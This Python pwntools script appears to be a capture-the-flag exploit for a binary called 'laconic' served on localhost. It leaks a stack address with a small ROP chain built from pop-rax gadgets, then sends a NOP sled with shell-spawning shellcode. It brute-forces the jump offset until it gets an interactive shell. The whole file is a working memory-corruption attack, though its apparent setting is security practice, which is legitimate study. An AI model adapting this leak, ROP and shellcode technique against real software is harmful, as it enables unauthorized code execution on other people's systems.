#!/usr/bin/env python3

from pwn import *

e = ELF("laconic")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            
            """)
    elif cond == 3:
        r = remote("localhost", 12345)

    return r


def main():
    i = 0
    cond = True
    while cond:
        try:
            r = conn(3)

            _start = 0x43000
            gadgetPopRax = 0x43018


            shell = asm(shellcraft.sh())

            shellcode = b"\x90"*(0x106 - 16 - 1 - len(shell))
            print("AMOUNT OF NOPs: ", len(shellcode))
            shellcode += shell


            payload = b"A"*8 + p64(gadgetPopRax) + p64(1) + p64(_start) + p64(gadgetPopRax) + p64(0) + p64(_start)

            r.send(payload)

            output = r.recv()
            print(output[8:])
            output = output[32:]
            leakStack = output[:8][::-1]
            print(leakStack.hex())
            leakStack = int(leakStack.hex(), 16)
            print(hex(leakStack))


            payload = b"A"*8 + p64(leakStack + 0x300 + 100*i) + shellcode


            sleep(0.4)

            payload = payload.ljust(0x106, b"\x00")

            r.send(payload)


            r.sendline(b"ls /")
            r.recv()
            print("This iteration:", i)
            cond = False

        except EOFError:
            print("NOT This iteration:", i)
            i *= -1
            if i >= 0:
                i += 1
            r.close()



    r.interactive()

if __name__ == "__main__":
    main()